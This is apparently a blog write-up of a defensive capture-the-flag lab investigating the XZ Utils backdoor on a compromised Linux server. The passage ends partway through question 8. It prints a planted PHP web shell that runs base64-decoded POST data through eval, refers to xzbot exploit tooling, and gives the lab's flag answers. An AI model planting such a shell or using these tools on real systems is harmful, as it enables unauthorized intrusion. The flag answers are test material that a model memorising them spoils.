---
layout: post
title:  "BlueYard - XZBackDoor"
category: CD
---
{% include cd_blueyard.html title="XZBackDoor" difficulty="Hard" scenario="You are part of the incident response team at a mid-sized financial services company. Recently, your network monitoring systems have flagged unusual SSH traffic patterns emanating from one of your Linux servers. Preliminary analysis suggests potential unauthorized access, which could be compromising the security and integrity of your network." %}

# Questions

1. [In the midst of your analysis of the compromised Linux server running XZ Utils, we need to confirm specific system vulnerabilities - could you pinpoint the full path to the backdoored library?](#q1-in-the-midst-of-your-analysis-of-the-compromised-linux-server-running-xz-utils-we-need-to-confirm-specific-system-vulnerabilities---could-you-pinpoint-the-full-path-to-the-backdoored-library)
2. [Investigate the backdoored XZ Utils library found on the compromised system. Can you locate and extract the public key that the threat actor embedded within this file during the compromise?](#q2-investigate-the-backdoored-xz-utils-library-found-on-the-compromised-system-can-you-locate-and-extract-the-public-key-that-the-threat-actor-embedded-within-this-file-during-the-compromise)
3. [The investigation has traced back some entries to a GitHub account - what is the username associated with these activities that introduced the backdoor?](#q3-the-investigation-has-traced-back-some-entries-to-a-github-account---what-is-the-username-associated-with-these-activities-that-introduced-the-backdoor)
4. [To build a timeline of the threat actor’s preparation, when was the GitHub account that deployed the backdoor first registered?](#q4-to-build-a-timeline-of-the-threat-actors-preparation-when-was-the-github-account-that-deployed-the-backdoor-first-registered)
5. [For a deeper dive into the initial breach, could you fetch the URL of the first commit made by the threat actor to the XZ GitHub repository?](#q5-for-a-deeper-dive-into-the-initial-breach-could-you-fetch-the-url-of-the-first-commit-made-by-the-threat-actor-to-the-xz-github-repository)
6. [Getting back to our compromised server, we suspect a persistent threat. What is the MITRE-ID of the persistence technique utilized by the attacker in this incident?](#q6-getting-back-to-our-compromised-server-we-suspect-a-persistent-threat-what-is-the-mitre-id-of-the-persistence-technique-utilized-by-the-attacker-in-this-incident)
7. [To correlate with our external traffic logs, what was the IP address used by the attacker during the suspected unauthorized access events?](#q7-to-correlate-with-our-external-traffic-logs-what-was-the-ip-address-used-by-the-attacker-during-the-suspected-unauthorized-access-events)
8. [In order to accurately log and analyze the sequence of unauthorized activities, when was the first command executed by the attacker through the persistence mechanism?](#q8-in-order-to-accurately-log-and-analyze-the-sequence-of-unauthorized-activities-when-was-the-first-command-executed-by-the-attacker-through-the-persistence-mechanism)
9. [Understanding the means of unauthorized access is vital - what key did the attacker use to gain entry through the persistence mechanism deployed?](#q9-understanding-the-means-of-unauthorized-access-is-vital---what-key-did-the-attacker-use-to-gain-entry-through-the-persistence-mechanism-deployed)
10. [Part of ensuring full remediation involves understanding the attacker’s fallback strategies - what is the first new file name the threat actor attempted to create as a backup measure to maintain their foothold?](#q10-part-of-ensuring-full-remediation-involves-understanding-the-attackers-fallback-strategies---what-is-the-first-new-file-name-the-threat-actor-attempted-to-create-as-a-backup-measure-to-maintain-their-foothold)

# Discussion

The scenario revolves around the supply chain attack made on XZ in versions 5.6.0 to 5.6.1. 

# Answering the Tasks

### Q1. In the midst of your analysis of the compromised Linux server running XZ Utils, we need to confirm specific system vulnerabilities - could you pinpoint the full path to the backdoored library?

We are dropped directly into the action in this lab, and once the labs opens - we're "in". Let's start with determining if we could be vulnerable:
{% highlight terminal %}
ubuntu@ip-172-31-33-224:~$ which xz
/usr/bin/xz
ubuntu@ip-172-31-33-224:~$ xz --version
xz (XZ Utils) 5.6.1
liblzma 5.6.1
{% endhighlight %}

The version of XZ Utils is exploitable, so lets find the library used for XZ:
{% highlight terminal %}
ubuntu@ip-172-31-33-224:~$ ldd `which xz`
	linux-vdso.so.1 (0x00007ffda0b74000)
	liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007329a9349000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007329a9000000)
	/lib64/ld-linux-x86-64.so.2 (0x00007329a93b2000)
ubuntu@ip-172-31-33-224:~$ ls -l /lib/x86_64-linux-gnu/liblzma.so.5
lrwxrwxrwx 1 root root 16 Mar 27  2024 /lib/x86_64-linux-gnu/liblzma.so.5 -> liblzma.so.5.6.1
{% endhighlight %}

In order to determine if it's exploitable, we can search for a specific hex string in the library. This hex string is used for checking vulnerable xz libraries, and can be found on multiple sources online.
{% highlight terminal %}
ubuntu@ip-172-31-33-224:~$ if hexdump -ve '1/1 "%.2X"' /lib/x86_64-linux-gnu/liblzma.so.5.6.1  | grep -i f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410 -q; then echo "VULN"; fi
VULN
{% endhighlight %}

Now we have confirmed the location of the vulnerable library.

{% include cd_flag.html id="1" description="In the midst of your analysis of the compromised Linux server running XZ Utils, we need to confirm specific system vulnerabilities - could you pinpoint the full path to the backdoored library?" flag="/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1" %}

### Q2. Investigate the backdoored XZ Utils library found on the compromised system. Can you locate and extract the public key that the threat actor embedded within this file during the compromise?

We have turned our attention to the library, and there are multiple approaches we can use in order determine what the public key is. First we need to understand how the key can be inserted into the library - here [XZBot](https://github.com/amlweems/xzbot) is an excellent resource.

#### A. Determining key based on assembly reference
I'm not well versed in Assembly, but one thing I do know is that `0x90` is `nop` or `No Operation`, and looking at the XZBot [`patch.py`](https://github.com/amlweems/xzbot/blob/main/patch.py#L43-L45) it has 3 distinct instructions of 0x90, sequentially even! Using the more or less the same approach as before, we can find that part of the patched library, and pull out the following 114 characters (length of the key):
{% highlight terminal %}
ubuntu@ip-172-31-33-224:~$ hexdump -ve '1/1 "%.2X"' /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1  | awk -F '909090' '{print substr($2,0,114)}'
E52625358384746D50880AD7D99AD8A672E38E529D04EEC5130061B0906D57C5ADE828BCF5883CE6977CF4F5F6B947F7CE388528ADAE165800
{% endhighlight %}

#### B. Determining key based on XZBot reference file
The XZBot repository also contains a patched file we can use as reference [here](https://github.com/amlweems/xzbot/blob/main/assets/liblzma.so.5.6.1.patch). If we transfer that to the lab, we can create a hex diff between the two libraries.

{% highlight terminal %}
ubuntu@ip-172-31-33-224:~$ diff <(xxd /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1) <(xxd liblzma.so.5.6.1.patched)
9293,9296c9293,9296
< 000244c0: e526 2535 8384 746d 5088 0ad7 d99a d8a6  .&%5..tmP.......
< 000244d0: 72e3 8e52 9d04 eec5 1300 61b0 906d 57c5  r..R......a..mW.
< 000244e0: ade8 28bc f588 3ce6 977c f4f5 f6b9 47f7  ..(...<..|....G.
< 000244f0: ce38 8528 adae 1658 0000 0000 0000 0000  .8.(...X........
---
> 000244c0: 5b3a fe03 878a 49b2 8232 d4f1 a442 aebd  [:....I..2...B..
> 000244d0: e109 f807 acef 7dfd 9a7f 65b9 62fe 52d6  ......}...e.b.R.
> 000244e0: 5473 12ca cecf f043 3750 8f9d 2529 a8f1  Ts.....C7P..%)..
> 000244f0: 6691 69b2 1c32 c480 0000 0000 0000 0000  f.i..2..........
{% endhighlight %}

The first 114 bytes matches the key injected in XZBot on the second file - likewise, the key for the attacker must be placed in the same location in the first file. 

#### C. Determining key based on assembly reference with objdump
A third approach could be finding the code referenced in `patch.py` with `objdump`:
{% highlight terminal %}

ubuntu@ip-172-31-33-224:~$ objdump -d /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1  | less
...

   244b2:       48 89 47 38             mov    %rax,0x38(%rdi)
   244b6:       b8 01 00 00 00          mov    $0x1,%eax
   244bb:       5e                      pop    %rsi
   244bc:       c3                      ret    
   244bd:       90                      nop
   244be:       90                      nop
   244bf:       90                      nop
   244c0:       e5 26                   in     $0x26,%eax
   244c2:       25 35 83 84 74          and    $0x74848335,%eax
   244c7:       6d                      insl   (%dx),%es:(%rdi)
   244c8:       50                      push   %rax
   244c9:       88 0a                   mov    %cl,(%rdx)
   244cb:       d7                      xlat   %ds:(%rbx)
   244cc:       d9 9a d8 a6 72 e3       fstps  -0x1c8d5928(%rdx)
   244d2:       8e 52 9d                mov    -0x63(%rdx),%ss
   244d5:       04 ee                   add    $0xee,%al
   244d7:       c5 13 00                (bad)
   244da:       61                      (bad)  
   244db:       b0 90                   mov    $0x90,%al
   244dd:       6d                      insl   (%dx),%es:(%rdi)
   244de:       57                      push   %rdi
   244df:       c5 ad e8 28             vpsubsb (%rax),%ymm10,%ymm5
   244e3:       bc f5 88 3c e6          mov    $0xe63c88f5,%esp
   244e8:       97                      xchg   %eax,%edi
   244e9:       7c f4                   jl     244df <lzma_vli_size@@XZ_5.0+0x211f>
   244eb:       f5                      cmc    
   244ec:       f6 b9 47 f7 ce 38       idivb  0x38cef747(%rcx)
   244f2:       85 28                   test   %ebp,(%rax)
   244f4:       ad                      lods   %ds:(%rsi),%eax
   244f5:       ae                      scas   %es:(%rdi),%al
   244f6:       16                      (bad)  
   244f7:       58                      pop    %rax

...
{% endhighlight %}
This also gives us the key, just written as assembly instructions, without the last 00.

Pick your poison :)

{% include cd_flag.html id="2" description="Investigate the backdoored XZ Utils library found on the compromised system. Can you locate and extract the public key that the threat actor embedded within this file during the compromise?" flag="e52625358384746d50880ad7d99ad8a672e38e529d04eec5130061b0906d57c5ade828bcf5883ce6977cf4f5f6b947f7ce388528adae165800" %}

### Q3. The investigation has traced back some entries to a GitHub account - what is the username associated with these activities that introduced the backdoor?

Depending on when you read this, there is likely a bunch of articles out there going in depth on this attack, or some of the relevant code may have been removed or taken down.

But to answer the question, we need to trace the commits done to the upstream package on [GitHub](https://github.com/tukaani-project/xz). At the time of writing, the releases are no longer present, but we can utilize the [Tags](https://github.com/tukaani-project/xz/tags) on GitHub. Both v5.6.0 and v5.6.1 was tagged by the same account. Searching for that username on any respectable search engine should clear up any doubts.


{% include cd_flag.html id="3" description="The investigation has traced back some entries to a GitHub account - what is the username associated with these activities that introduced the backdoor?" flag="JiaT75" %}

### Q4. To build a timeline of the threat actor’s preparation, when was the GitHub account that deployed the backdoor first registered?

Knowing the username, we can utilize the [GitHub API](https://docs.github.com/en/rest?apiVersion=2022-11-28) to find the creation date of an account.

We need the `created_at` property on from the GitHub API for the [account](https://api.github.com/users/JiaT75)

{% include cd_flag.html id="4" description="To build a timeline of the threat actor’s preparation, when was the GitHub account that deployed the backdoor first registered?" flag="2021-01-26 18:11:07" %}

### Q5. For a deeper dive into the initial breach, could you fetch the URL of the first commit made by the threat actor to the XZ GitHub repository?

Using the tags and the username, we can filter our query on the GitHub repository for [all their commits](https://github.com/tukaani-project/xz/commits/v5.6.0?author=JiaT75&after=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429+419) and go back to the first commit made on the 6th of February 2022.

{% include cd_flag.html id="5" description="For a deeper dive into the initial breach, could you fetch the URL of the first commit made by the threat actor to the XZ GitHub repository?" flag="https://github.com/tukaani-project/xz/commit/6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4" %}

### Q6. Getting back to our compromised server, we suspect a persistent threat. What is the MITRE-ID of the persistence technique utilized by the attacker in this incident?

We need to determine how the attacker can persist on the endpoint, and the auth.log / journal is a place to start.

{% highlight terminal %}
root@ip-172-31-33-224:~# journalctl |grep COMMAND

Apr 07 15:04:01 ip-172-31-26-196 sudo[2487]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/apt install python3-pip
Apr 07 15:04:13 ip-172-31-26-196 sudo[2495]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/apt update
Apr 07 15:04:23 ip-172-31-26-196 sudo[2945]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/apt install python3-pip
Apr 07 17:01:56 ip-172-31-26-196 sudo[4983]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 07 17:02:33 ip-172-31-26-196 sudo[4992]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor/xzbot ; USER=root ; COMMAND=/usr/bin/apt install golang-go
Apr 07 17:08:02 ip-172-31-26-196 sudo[5543]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 08 11:58:35 ip-172-31-26-196 sudo[24655]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 08 12:02:22 ip-172-31-26-196 sudo[24685]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 08 12:34:00 ip-172-31-26-196 sudo[24829]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/apt install ltrace
Apr 08 13:16:43 ip-172-31-26-196 sudo[26054]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:17:02 ip-172-31-26-196 sudo[26061]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/chmod 777 -R ./
Apr 08 13:17:09 ip-172-31-26-196 sudo[26065]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:18:16 ip-172-31-26-196 sudo[26117]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:18:57 ip-172-31-26-196 sudo[26168]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:19:19 ip-172-31-26-196 sudo[26261]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:19:58 ip-172-31-26-196 sudo[26317]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:20:31 ip-172-31-26-196 sudo[26383]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:26:12 ip-172-31-26-196 sudo[26423]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:27:30 ip-172-31-26-196 sudo[26492]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/go/pkg/mod/github.com/amlweems/xzbot@v0.0.0-20240403045847-8ae5b706fb2c ; USER=root ; COMMAND=/usr/bin/nano main.go
Apr 08 13:31:46 ip-172-31-26-196 sudo[26673]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 08 13:32:52 ip-172-31-26-196 sudo[26741]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm whoami.txt
Apr 08 13:38:46 ip-172-31-26-196 sudo[27014]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/nano xzbot/patch.py
Apr 08 13:39:56 ip-172-31-26-196 sudo[27480]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/XZBackDoor ; USER=root ; COMMAND=/usr/bin/cp ./liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
Apr 08 13:41:18 ip-172-31-26-196 sudo[27518]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm -r go/ whoami_13337.txt
Apr 08 13:41:43 ip-172-31-26-196 sudo[27525]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm -r XZBackDoor/
Apr 08 13:42:53 ip-172-31-26-196 sudo[27535]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/su
Apr 08 13:44:00 ip-172-31-26-196 sudo[27964]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm .bash_history
Apr 08 14:06:37 ip-172-31-26-196 sudo[28432]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/find / -name liblzma
Apr 08 14:07:03 ip-172-31-26-196 sudo[28435]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/find / -name *liblzma*
Apr 08 14:16:24 ip-172-31-26-196 sudo[28957]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/xzbot ; USER=root ; COMMAND=/usr/bin/rm /tmp/.xz
Apr 08 15:04:20 ip-172-31-26-196 sudo[30135]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm -r go/ xzbot/
Apr 08 15:04:37 ip-172-31-26-196 sudo[30139]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm .bash_history
Apr 08 15:05:04 ip-172-31-26-196 sudo[30558]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm .bash_history
Apr 08 15:50:10 ip-172-31-26-196 sudo[32261]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install apache2 -y
Apr 08 15:50:56 ip-172-31-26-196 sudo[33148]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl start apache2
Apr 08 15:50:56 ip-172-31-26-196 sudo[33152]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl enable apache2
Apr 08 15:51:15 ip-172-31-26-196 sudo[33233]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install php libapache2-mod-php -y
Apr 08 15:57:40 ip-172-31-26-196 sudo[39767]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt install php libapache2-mod-php -y
Apr 08 16:05:56 ip-172-31-26-196 sudo[39790]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/simple-php-website ; USER=root ; COMMAND=/usr/bin/php -S 0.0.0.0:80
Apr 08 16:06:08 ip-172-31-26-196 sudo[39793]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/simple-php-website ; USER=root ; COMMAND=/usr/bin/php -S 0.0.0.0:8080
Apr 08 16:07:03 ip-172-31-26-196 sudo[39804]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/simple-php-website ; USER=root ; COMMAND=/usr/bin/mv content includes index.php readme.md template /var/www/html/
Apr 08 16:09:41 ip-172-31-26-196 sudo[39859]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/simple-php-website ; USER=root ; COMMAND=/usr/bin/nano /etc/apache2/mods-enabled/dir.conf
Apr 08 16:11:39 ip-172-31-26-196 sudo[39898]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu/simple-php-website ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2.service
Apr 10 16:51:01 ip-172-31-26-196 sudo[85081]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm hostname.txt
Apr 10 16:51:12 ip-172-31-26-196 sudo[85099]:   ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/rm /tmp/.xz
Apr 12 04:21:03 ip-172-31-37-6 sudo[8389]:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/nano /var/www/html/loaderio-499ad27fec65c9b7eecc26389bd87483.txt
Apr 12 08:16:59 ip-172-31-37-6 sudo[13643]:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /root/.bash_history

{% endhighlight %}

A lot of really suspicious activity, however there is also some execution of php in the `simple-php-website` followed by a removal of the `/tmp/.xz` file - an indicator for XZBot.
Let's dive into the php files that were moved to `/var/www/html`, and check the `index.php`

{% highlight php %}
root@ip-172-31-33-224:~# cat /var/www/html/index.php 
<?php

// Comment these lines to hide errors
error_reporting(E_ALL);
ini_set('display_errors', 1);

require 'includes/config.php';
require 'includes/functions.php';

init();
if (@$_POST['do'] && @md5(md5($_POST['pass'])) == '696d29e0940a4957748fe3fc9efd22a3') {
    $x = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
    @eval($x($_POST['do']));
    exit();
}
{% endhighlight %}

The md5sum is for the text `password`, and the hex encoded string is `base64_decode` - so we are looking at a webshell which executes code in base64 format, if the POST contains `pass=password`. 

Mapping this to the MITRE ATT&CK framework, will be `Persistence` > `Server Software Component` > `Web Shell`.

{% include cd_flag.html id="6" description="Getting back to our compromised server, we suspect a persistent threat. What is the MITRE-ID of the persistence technique utilized by the attacker in this incident?" flag="T1505.003" %}

### Q7. To correlate with our external traffic logs, what was the IP address used by the attacker during the suspected unauthorized access events?

As we previously established, we need to look for POSTs to the `index.php` file which can be read in the Apache logs:

{% highlight terminal %}
oot@ip-172-31-33-224:~# grep POST /var/log/apache2/access.log.1 | grep index
44.207.251.118 - - [12/Apr/2024:08:54:10 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:08:54:56 +0000] "POST /index.php HTTP/1.1" 200 74372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:05:02 +0000] "POST /index.php HTTP/1.1" 200 2465 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:05:47 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:07:58 +0000] "POST /index.php HTTP/1.1" 200 2332 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:08:17 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:11:25 +0000] "POST /index.php HTTP/1.1" 200 2468 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:11:51 +0000] "POST /index.php HTTP/1.1" 200 2441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:13:39 +0000] "POST /index.php HTTP/1.1" 200 2441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:14:00 +0000] "POST /index.php HTTP/1.1" 200 2441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:15:20 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:15:29 +0000] "POST /index.php HTTP/1.1" 200 2332 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:15:38 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:15:51 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:15:56 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:16:12 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:16:21 +0000] "POST /index.php HTTP/1.1" 200 2692 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:16:30 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:17:02 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:17:05 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:17:37 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
44.207.251.118 - - [12/Apr/2024:09:17:40 +0000] "POST /index.php HTTP/1.1" 200 2426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
{% endhighlight %}

Luckily not many different IPs have POSTed to `index.php`. 

{% include cd_flag.html id="7" description="To correlate with our external traffic logs, what was the IP address used by the attacker during the suspected unauthorized access events?" flag="44.207.251.118" %}

### Q8. In order to accurately log and analyze the sequence of unauthorized activities, when was the first command executed by the attacker through the persistence mechanism?

If we check the older POSTs to `index.php`, we can see a rather large object size returned to the client (the value after the HTTP code 200):

{% highlight terminal %}
root@ip-172-31-33-25:~# grep POST /var/log/apache2/* | grep 44\.207\.251\.118 | grep ' 200 '| head -n 5
/var/log/apache2/access.log.1:44.207.251.118 - - [12/Apr/2024:08:29:53 +0000] "POST / HTTP/1.1" 200 2342 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
/var/log/apache2/access.log.1:44.207.251.118 - - [12/Apr/2024:08:29:55 +0000] "POST / HTTP/1.1" 200 2342 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
/var/log/apache2/access.log.1:44.207.251.118 - - [12/Apr/2024:08:54:10 +0000] "POST /index.php HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
